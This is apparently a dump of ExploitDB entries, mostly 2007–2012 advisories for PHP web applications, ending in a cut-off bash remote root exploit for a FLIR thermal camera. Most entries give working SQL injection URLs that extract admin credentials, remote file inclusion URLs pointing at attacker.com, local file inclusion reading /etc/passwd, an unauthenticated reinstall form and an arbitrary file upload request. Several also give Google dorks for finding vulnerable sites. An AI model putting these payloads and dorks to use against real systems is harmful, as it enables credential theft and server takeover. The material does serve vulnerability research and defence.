Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : Online Rental Property Script\r\nversion       : <= 4.5\r\nVendor        : http://www.online-rent.com\r\nDescription   :\r\n\r\nSince 2003 we develop, sell and support our ONLINE BOOKING ENGINE for rental properties with real estate option. Joomla CMS is now integrated with our script. DESKTOP software for property management by owners/agents. Online and offline payments. Comission based/subscription based advertising for owners. Two booking calendars, three online booking types. Google Maps integration and NEW Google Maps property listing. Advanced administration features: additional services, description fields, taxes, custom links and pages, multiple language support, multiple currencies, configurable search. Property Management features: Advanced Reservation Management, HTML pages, SEO optimization, traffic report, Ratecard, price grid and many more ... Newsletter module, cronjob for recurring tasks, IP ban, activity log. You can build your own design and 100% customize the text used in the script. 14 predefined design templates and 10 predefined display styles. Easy upgrades. Add property wizard\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nInput passed to the "pid" parameter is not properly verified before being used to sql query. \r\nThis can be exploited thru the browser and get the username and hash md5 password from admin.\r\nSuccessful exploitation requires that "magic_quotes" is off\r\n\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://www.target.com/index.php?pid=-1%20union%20select%201,concat(id,0x3a,user,0x3a,password,0x3a,access,0x3a,email),3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2%20from%20admin--&user=det\r\n\r\nDork:\r\n~~~~\r\nGoogle    : "allinurl:index.php?user=daysbooking"\r\n\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Edit the source code to ensure that input is properly verified.\r\n- Turn on magic_quotes in php.ini\r\n \r\n\r\nTimeline:\r\n~~~~~~~~\r\n\r\n- 01 - 05 - 2008 bug found\r\n- 01 - 05 - 2008 vendor contacted\r\n- 05 - 05 - 2008 advisory released\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke\r\n~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b\r\n~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n~ special for rgod - good bye mate, thanks for the great works.\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2008-05-05]', u'description': u"Online Rental Property Script 4.5 - 'pid' SQL Injection", u'platform': u'php', u'author': u'K-159', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-05-05T00:00:00+00:00', u'_id': 5542, u'type': u'webapps', u'port': 0}

CVE: []
Description: Softerra Time-Assistant 6.2 - 'inc_dir' Remote File Inclusion
{u'code': u'____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_80$2007\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_80$2007] Softerra Time-Assistant <= 6.2 (inc_dir) Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : March, 29th 2007\r\nLocation       : Australia, Sydney\r\nWeb            : http://advisories.echo.or.id/adv/adv80-K-159-2007.txt\r\nCritical Lvl   : Dangerous\r\nImpact\t       : System access\r\nWhere\t       : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : Time-Assistant  \r\nversion       : <= 6.2 Time-Assistant Standard, Time-Assistant Enterprise, Time-Assistant light\r\nVendor        : http://www.time-assistant.com\r\nDescription :\r\n\r\nTime-Assistant - Web based time tracking software for Internet/Intranet featuring employee timesheets and various reports and project management tools that include salary calculation, invoices and expenses, online services and PDA package. Time-Assistant is professional timesheet software for your business. It is a daily time tracking solution designed to reduce the drudgery of recording, analyzing and reporting associated with everyday working routine. With Time-Assistant you can easily manage employee timesheets and expenses, calculate salaries, prepare project estimates, get invoices based on personal or client work rates.\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n- Invalid include function at lib/timesheet.class.php :  \r\n  \t\r\n----------------lib/timesheet.class.php-------------------\r\n...\r\ninclude ($inc_dir . "database.inc.php");\r\ninclude ($lib_dir . "sqlstorage.class.php");\r\ninclude ($lib_dir . "lib.php");\r\ninclude ($lib_dir . "timesheet.lib.php");\r\n...\r\n----------------------------------------------------------------\r\n\r\n\r\nInput passed to the "inc_dir" and "lib_dir" parameter in lib/timesheet.class.php is not properly verified before being used to include files. \r\nThis can be exploited to include arbitrary files from local or external resources.\r\nSuccessful exploitation requires that "register_globals" is enabled.\r\n\r\n\r\n\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://www.target.com/[Time-Assistant_path]/lib/timesheet.class.php?inc_dir=http://attacker.com/evil?\r\n\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Edit the source code to ensure that input is properly verified.\r\n- Turn off register_globals\r\n\r\n\r\nNotification:\r\n~~~~~~\r\n- 28-03-2007 bugs found\r\n- 28-03-2007 vendor contacted but no response\r\n- 29-03-2007 advisory released\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, and my little son, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw\r\n~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2007-03-29]', u'description': u"Softerra Time-Assistant 6.2 - 'inc_dir' Remote File Inclusion", u'platform': u'php', u'author': u'K-159', u'cve': [], u'source': u'ExploitDB', u'date': u'2007-03-29T00:00:00+00:00', u'_id': 3600, u'type': u'webapps', u'port': 0}

CVE: []
Description: Softbiz Web Host Directory Script - 'host_id' SQL Injection
{u'code': u'____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_89$2008\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_89$2008] Softbiz Web Host Directory Script (search_result.php host_id) Blind Sql Injection Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : April, 28 th 2007\r\nLocation       : Jakarta, Indonesia\r\nWeb            : http://advisories.echo.or.id/adv/adv89-K-159-2008.txt\r\nCritical Lvl   : Medium\r\nImpact\t       : System access\r\nWhere\t       : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : Softbiz Web Host Directory Script\r\nversion       : unknown\r\nVendor        : http://www.softbizscripts.com/web-hosting-directory-script.php\r\nDescription   :\r\n\r\nWeb Hosting Directory Script is a highly Advanced PHP script to run your own web Hosting comparison site.\r\nSince companies in web hosting industry offer very high volumes of affiliate commissions (even up to $80 or more per sale),\r\nhence this script has a great potential to generate very heavy revenues for you.\r\nScript is built with focus on making it SIMPLE for webmasters to manage and very convenient for users to select perfect web Hosting.\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nInput passed to the "host_id" parameter in search_result.php is not properly verified before being used to sql query. \r\nThis can be exploited thru the browser and get the username and password from admin in plain text.\r\nSuccessful exploitation requires that "magic_quotes" is off\r\n\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://www.target.com/hostdirectory/search_result.php?host_id=-1 union select 1,2,concat(sb_id,0x3a,sb_admin_name,0x3a,sb_pwd),4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9 from sb_host_admin--\r\n\r\nDork:\r\n~~~~\r\nGoogle    : "inurl:Powered by SoftbizScripts" "Subscribe Newsletter"\r\naltavista : Home Search Plans  Host Reviews  Register  Login Contact Us\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Edit the source code to ensure that input is properly verified.\r\n- Turn on magic_quotes in php.ini\r\n \r\n\r\nTimeline:\r\n~~~~~~~~\r\n\r\n- 28 - 04 - 2008 bug found\r\n- 28 - 04 - 2008 advisory released\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,fuzk3_k3ndi,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b\r\n~ SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n~ special for rgod - good bye mate, thanks for the great works.\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2008-04-28]', u'description': u"Softbiz Web Host Directory Script - 'host_id' SQL Injection", u'platform': u'php', u'author': u'K-159', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-04-28T00:00:00+00:00', u'_id': 5517, u'type': u'webapps', u'port': 0}

CVE: []
Description: Anserv Auction XL - 'cat' SQL Injection
{u'code': u'____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_92$2008\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_92$2008] Anserv Auction XL (viewfaqs.php cat) Blind Sql Injection Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : May, 5 th 2008\r\nLocation       : Jakarta, Indonesia\r\nWeb            : http://advisories.echo.or.id/adv/adv92-K-159-2008.txt\r\nCritical Lvl   : Medium\r\nImpact\t       : System access\r\nWhere\t       : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : Anserv Auction XL\r\nversion       : \r\nVendor        : http://auctionxl.com/ http://anserv.com/\r\nDescription   :\r\n\r\nAuction XL offers many features in an auction software package. If you would like to bill your clients monthly for their accumulated fees,\r\nXL is the right choice for your auction software. "Name Your Price" offers is just one of the newly added features.\r\nAuction XL has many features included making it a robust auction software package that offers complete user interaction and admin control\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nInput passed to the "cat" parameter is not properly verified before being used to sql query. \r\nThis can be exploited thru the browser and get the username and hash md5 password from admin.\r\nSuccessful exploitation requires that "magic_quotes" is off\r\n\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://www.target.com/viewfaqs.php?cat=-1%20union%20select%20concat(id,0x3a,username,0x3a,password)%20from PHPAUCTIONXL_adminusers--\r\n\r\nDork:\r\n~~~~\r\nGoogle    : "allinurl:viewfaqs.php?cat="\r\nAltavista : "Home  |  Sell an item  |  Register  |  Login  |  Community  | Site Map |  Help"\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Edit the source code to ensure that input is properly verified.\r\n- Turn on magic_quotes in php.ini\r\n \r\n\r\nTimeline:\r\n~~~~~~~~\r\n\r\n- 02 - 05 - 2008 bug found\r\n- 03 - 05 - 2008 vendor contacted\r\n- 05 - 05 - 2008 advisory released\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke\r\n~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b\r\n~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n~ special for rgod - good bye mate, thanks for the great works.\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2008-05-05]', u'description': u"Anserv Auction XL - 'cat' SQL Injection", u'platform': u'php', u'author': u'K-159', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-05-05T00:00:00+00:00', u'_id': 5543, u'type': u'webapps', u'port': 0}

CVE: []
Description: Kmita Mail 3.0 - 'file' Remote File Inclusion
{u'code': u'____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_94$2008\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_94$2008]   Kmita Mail <= 3.0 (file) Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : May, 5 th 2008\r\nLocation       : Jakarta, Indonesia\r\nWeb            : http://advisories.echo.or.id/adv/adv94-K-159-2008.txt\r\nCritical Lvl   : High\r\nImpact\t       : System access\r\nWhere\t       : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : Kmita Mail\r\nversion       : <= 3.0\r\nVendor        : http://www.kmitascripts.com/kmitamhome/\r\nDescription   :\r\n\r\nEasy, fastest and Secure form processor. Installs directly from the server pre configured to your server. No programming hassles, no opening code files. Kmita Mail v.3 has inbuilt 3 levels of spam protection and has features like security image (CAPTCHA). The script works in backend, so you have full control over your web design. Supports most basic contact forms, feedback forms, order forms and other feature which you may like to use : Multiple visitor file UPLOADS, Auto responder with attachment, Success Page, Error Page, Validation ,To CC BCC email addresses. Kmita Mail has its own ADMIN utility and handles UNLIMITED FORMS with one installation. Best for novices and experts who want to SAVE precious TIME\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n\r\nInput passed to the "file" parameter in htmlcode.php is not properly verified before being used to include files. \r\nThis can be exploited to include arbitrary files from local or external resources.\r\nSuccessful exploitation requires that "register_globals" is enabled.\r\n\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://www.target.com/kmitaadmin/kmitam/htmlcode.php?file=http://attacker.com/evil?\r\n\r\nNote: sometimes need to login first.the default user & password are admin\r\n\r\nDork:\r\n~~~~\r\nGoogle    : "inurl:/kmitam/"\r\n \r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Edit the source code to ensure that input is properly verified.\r\n- Turn off register_globals in php.ini\r\n \r\n\r\nTimeline:\r\n~~~~~~~~\r\n\r\n- 02 - 05 - 2008 bug found\r\n- 05 - 05 - 2008 vendor contacted\r\n- 05 - 05 - 2008 advisory released\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, zautha my light of eyes, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v, az01,negative,the_hydra,neng chika, str0ke\r\n~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b\r\n~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy, ketut, rizal, cR4SH3R, kuntua, stev_manado, nofry,k1tk4t,0pt1c\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n~ special for rgod - good bye mate, thanks for the great works.\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2008-05-05]', u'description': u"Kmita Mail 3.0 - 'file' Remote File Inclusion", u'platform': u'php', u'author': u'K-159', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-05-05T00:00:00+00:00', u'_id': 5545, u'type': u'webapps', u'port': 0}

CVE: []
Description: LightNEasy 3.1.x - Multiple Vulnerabilities
{u'code': u'##############################################################################\r\n#Title:             LightNEasy 3.1.x Multiple Vulnerabilites                 #\r\n#Vendor:            http://lightneasy.org/                                   #\r\n#Dork:              "Powered by LightNEasy"                                  #\r\n##############################################################################\r\n#AUTHOR:            ITSecTeam                                                #\r\n#Email:             Bug@ITSecTeam.com                                        #\r\n#Website:           http://www.itsecteam.com                                 #\r\n#Forum :            http://forum.ITSecTeam.com                               #\r\n#Original Advisory: www.ITSecTeam.com/en/vulnerabilities/vulnerability46.htm #\r\n#Thanks:            r3dm0v3 [r3dm0v3_at_ymail.com]                           #\r\n##############################################################################\r\n\r\n#DESCRIPTION (by vendor):#####################################################\r\n LightNEasy, a simple and light Content Management System and Website Builder\r\n\r\n\r\n#1-fckeditor Remote File Upload###############################################\r\n #Desc:\r\n Remote users can upload file without authentication.\r\n\r\n #POC:\r\n http://site.com/fckeditor/editor/filemanager/connectors/test.html\r\n\r\n\r\n#2-Reinstallation#############################################################\r\n #Desc:\r\n  After software installation it is still possible for remote users to reinstall\r\n  the software without authentication.\r\n\r\n #Exploit:\r\n  <html>\r\n  <form name="form1" action="http://site.com/LightNEasy/install1.php" method="post"><table>\r\n  <tr><td>Enter password:</td><td><input type="password" name="password" value="" /></td></tr>\r\n  <tr><td>Repeat password:</td><td><input type="password" name="password1" value="" /></td></tr>\r\n  <tr><td>Admin name:</td><td><input type="text" name="admin" value="" /></td></tr>\r\n  <tr><td>Admin email:</td><td><input type="text" name="email" value="" /></td></tr>\r\n  <tr><td>Website email:</td><td><input type="text" name="wemail" value="" /></td></tr>\r\n  <tr><td>Tables prefix:</td><td><input type="text" name="prefix" value="LNE_" /></td></tr>\r\n  <tr><td>Database system:</td><td><select name="database" ><option value="SQLite2">SQLite 2 (following fields empty)</option><option value="SQLite3">SQLite 3 (following fields empty)</option><option value="MySQL">MySQL</option></select></td></tr>\r\n  <tr><td>Database name:</td><td><input type="text" name="databasename" value="" /></td></tr>\r\n  <tr><td>MySQL login:</td><td><input type="text" name="databaselogin" value="" /></td></tr>\r\n  <tr><td>MySQL password:</td><td><input type="text" name="databasepassword" value="" /></td></tr>\r\n  <tr><td>MySQL host:</td><td><input type="text" name="databasehost" value="" /></td></tr>\r\n  <tr><td>\xa0</td><td><input type="submit" name="submit" value="Create Database" /></td></tr>\r\n  </table></form>\r\n  </html>\r\n\r\n\r\n#3-Filemanager plugin Local File Inclusion####################################\r\n #Bug-file: /plugins/filemanager/get_file.php\r\n   29:  if(!isset($language)) $language = \'en\';\r\n   30:  include("languages/lang_$language.inc"); //<---- vulnerable line!\r\n\r\n #Exploit:\r\n  http://site.com/plugins/filemanager/get_file.php?language=[file_to_include]%00\r\n\r\n\r\n#4-Filemanager plugin Local File Disclosure###################################\r\n #Bug-File:\r\n   14:  if(isset($_REQUEST[\'file\'])) $file = $_REQUEST[\'file\'];\r\n   ...\r\n   56:  readfile($file);\r\n\r\n #EXPLOIT:\r\n  http://site.com/plugins/filemanager/get_file.php?file=[file_to_read]', u'description': u'LightNEasy 3.1.x - Multiple Vulnerabilities', u'platform': u'php', u'author': u'ITSecTeam', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-04-21T00:00:00+00:00', u'_id': 12322, u'type': u'webapps', u'port': 0}

CVE: []
Description: sflog! 1.00 - Multiple Vulnerabilities
{u'code': u'  :::::::-.   ...    ::::::.    :::.\r\n   ;;,   `\';, ;;     ;;;`;;;;,  `;;;\r\n   `[[     [[[[\'     [[[  [[[[[. \'[[\r\n    $$,    $$$$      $$$  $$$ "Y$c$$\r\n    888_,o8P\'88    .d888  888    Y88\r\n    MMMMP"`   "YmmMMMM""  MMM     YM\r\n \r\n   [ Discovered by dun \\ posdub[at]gmail.com ]\r\n   [ 2012-07-05                              ]\r\n #################################################\r\n # [ sflog! <= 1.00 ]  Multiple Vulnerabilities  #\r\n #################################################\r\n #\r\n # Script: "sflog! is a flat and light CMS::Blog system."\r\n #\r\n # Vendor:   http://sourceforge.net/projects/sflog/\r\n # Download: http://sourceforge.net/projects/sflog/files/sflog/\r\n #\r\n #\r\n # [ LFI ]\r\n #\r\n # PoC: http://localhost/sflog/index.php?blog=admin&section=../../../../../../../etc/&permalink=passwd\r\n #\r\n # File: ./sflog/index.php (lines: 1, 53)\r\n #    ..cut..\r\n #    1   <?php include("./includes/pageHeader.inc.php"); ?>      // 1\r\n #    ..cut..\r\n #\r\n #    53  require_once("./includes/entries.inc.php");             // 4\r\n #    ..cut..\r\n #\r\n # File: ./sflog/includes/pageHeader.inc.php (lines: 20, 35)\r\n #    ..cut..\r\n #    20   $_blogID = $_GET[\'blog\'];                              // 2\r\n #    ..cut..\r\n #\r\n #    35  $_sectionID = $_GET[\'section\'];                         // 3\r\n #    ..cut..\r\n #\r\n # File: ./sflog/includes/entries.inc.php (lines: 2-11)\r\n #    ..cut..\r\n #    2  include_once("./cms/BlogEntry.class.php");               // 5\r\n #    3  include_once("./cms/Blog.class.php");\r\n #    4  $blog = new BlogEntry($_blogID,$_sectionID);             // 6\r\n #    5  $cms = new Blog();\r\n #    6  $pages = $cms->getPostPerPage($_blogID);\r\n #    7\r\n #    8  // checks for permalink\r\n #    9  if (isset($_GET[\'permalink\'])){\r\n #   10      $_permalink = $_GET[\'permalink\'];                    // 8\r\n #   11      $blog->showEntry($_permalink);                       // 9\r\n #    ..cut..\r\n #\r\n # File: ./sflog/cms/BlogEntry.class.php (lines: 37-85)\r\n #    ..cut..\r\n #   37 class BlogEntry {\r\n #    ..cut..\r\n #   47  function BlogEntry($blogID,$sectionID){                  // 7\r\n #   48       error_reporting(E_USER_ERROR);                      //\r\n #   49       $this->blogID = $blogID;                            //\r\n #   50       $this->sectionID = $sectionID;                      //\r\n #   51   }\r\n #    ..cut..\r\n #   57   function showEntry($entryID){                           // 10\r\n #    ..cut..\r\n #   60        $JournalContentDir = "./blogs/".$this->blogID."/data/".$this->sectionID; // 11\r\n #    ..cut..\r\n #   80        $JournalContent = $JournalContentDir."/".$entryID; // 12\r\n #    ..cut.. \r\n #   83        include_once $JournalContent;                      // 13  [LFI]\r\n #    ..cut..\r\n # \r\n #################################################\r\n # [ Admin Password Disclosure ]\r\n #\r\n # PoC: http://localhost/sflog/admin/passwd\r\n # \r\n #################################################\r\n # [ Arbitrary File Upload ]\r\n #\r\n # File: ./sflog/admin/includes/uploadContent.inc.php (lines: 62-72)\r\n #    ..cut..\r\n #    62   if (trim($_FILES[\'fileID\'][\'name\'])!=\'\'){\r\n #    63     $uploaddir = BLOG_PATH.$blogID.BLOG_UPLOADS;\r\n #    64     $uploadfile = $uploaddir . basename($_FILES[\'fileID\'][\'name\']);\r\n #    65     echo \'<pre>\';\r\n #    66     if (move_uploaded_file($_FILES[\'fileID\'][\'tmp_name\'], $uploadfile)) {\r\n #    67       print(UPLOAD_SUCCESS);\r\n #    68     } else {\r\n #    69       print(\'<font color="red">\'.UPLOAD_FAILED.\'</font>\');\r\n #    70     }\r\n #    71     print "</pre>";\r\n #    72   }\r\n #    ..cut..\r\n #\r\n # PoC:\r\n #\r\n # POST /sflog/admin/includes/uploadContent.inc.php HTTP/1.1\r\n # Host: localhost\r\n # User-Agent: Mozilla/5.0\r\n # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n # Accept-Language: pl,en-us;q=0.7,en;q=0.3\r\n # Accept-Encoding: gzip, deflate\r\n # Connection: keep-alive\r\n # Content-Type: multipart/form-data; boundary=---------------------------4827543632391\r\n # Content-Length: 411\r\n # -----------------------------4827543632391\r\n # Content-Disposition: form-data; name="blogID"\r\n # \r\n # admin\r\n # -----------------------------4827543632391\r\n # Content-Disposition: form-data; name="MAX_FILE_SIZE"\r\n # \r\n # 0\r\n # -----------------------------4827543632391\r\n # Content-Disposition: form-data; name="fileID"; filename="info.php"\r\n # Content-Type: text/x-php\r\n # \r\n # <?php phpinfo(); ?>\r\n # \r\n # -----------------------------4827543632391--\r\n # \r\n # \r\n # Uploaded file will be here: http://localhost/sflog/blogs/admin/uploads/info.php\r\n # \r\n ### [ dun / 2012 ] #####################################################', u'description': u'sflog! 1.00 - Multiple Vulnerabilities', u'platform': u'php', u'author': u'dun', u'cve': [], u'source': u'ExploitDB', u'date': u'2012-07-06T00:00:00+00:00', u'_id': 19626, u'type': u'webapps', u'port': 0}

CVE: []
Description: FLIR Thermal Camera PT-Series (PT-334 200562) - Root Remote Code Execution
{u'code': u'#!/bin/bash\r\n#\r\n#\r\n# FLIR Systems FLIR Thermal Camera PT-Series (PT-334 200562) Remote Root Exploit\r\n#\r\n#\r\n# Vendor: FLIR Systems, Inc.\r\n# Product web page: http://www.flir.com\r\n# Affected version: Firmware version: 8.0.0.64\r\n#                   Software version: 10.0.2.43\r\n#                   Release: 1.3.4 GA, 1.3.3 GA and 1.3.2\r\n#\r\n# Summary: FLIR\'s PT-Series of high-performance, multi-sensor pan/tilt cameras\r\n# bring thermal and visible-light imaging together in a system that gives you\r\n# video and control over both IP and analog networks. The PT-Series\' precision\r\n# pan/tilt mechanism gives you accurate pointing control while providing fully\r\n# programmable scan patterns, radar slew-to-cue, and slew-to-alarm functions.\r\n# PT-Series cameras define a new standard of performance with five models that\r\n# provide full 640x480 thermal resolution.\r\n#\r\n# Desc: FLIR Camera PT-Series suffers from multiple unauthenticated remote command\r\n# injection vulnerabilities. The vulnerability exist due to several POST parameters\r\n# in controllerFlirSystem.php script when calling the execFlirSystem() function not\r\n# being sanitized when using the shell_exec() PHP function while updating the network\r\n# settings on the affected device. This allows the attacker to execute arbitrary system\r\n# commands as the root user and bypass access controls in place.\r\n#\r\n# ========================================================\r\n#\r\n# bash-3.2$ ./flir0.sh 10.0.0.10 8088\r\n#\r\n# Probing target: http://10.0.0.10:8088\r\n#\r\n# Status: 200\r\n# Target seems OK!\r\n# You got shell!\r\n# Ctrl+C to exit.\r\n#\r\n# [root@FLIR ~]# id;pwd;uname -a\r\n# uid=0(root) gid=0(root)\r\n# /var/www/data/maintenance\r\n# Linux FLIR 2.6.10_mvl401-davinci_evm-PSP_01_30_00_082 #1 Wed May 1 12:25:27 PDT 2013 armv5tejl unknown\r\n# [root@FLIR ~]# ^C\r\n# bash-3.2$ \r\n#\r\n# ========================================================\r\n#\r\n# Tested on: Linux 2.6.18_pro500-davinci_evm-arm_v5t_le\r\n#            Linux 2.6.10_mvl401-davinci_evm-PSP_01_30_00_082\r\n#            Nexus 